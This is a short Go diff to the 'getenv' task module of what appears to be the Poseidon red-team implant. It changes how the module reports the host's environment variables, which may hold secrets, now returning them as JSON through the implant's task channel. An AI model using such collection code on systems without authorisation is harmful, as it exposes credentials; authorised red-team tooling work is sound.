@@ -1,8 +1,8 @@
 package getenv
 
 import (
+	"encoding/json"
 	"os"
-	"strings"
 
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
@@ -12,6 +12,17 @@ func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
 	tMsg := structs.ThreadMsg{}
 	tMsg.TaskItem = task
 	tMsg.Error = false
-	tMsg.TaskResult = []byte(strings.Join(os.Environ(), "\n"))
+	environOutput := map[string]interface{}{
+		"env": os.Environ(),
+	}
+
+	output, err := json.MarshalIndent(environOutput, "", "	")
+	if err != nil {
+		tMsg.TaskResult = []byte(err.Error())
+		tMsg.Error = true
+		threadChannel <- tMsg
+		return
+	}
+	tMsg.TaskResult = output
 	threadChannel <- tMsg
 }
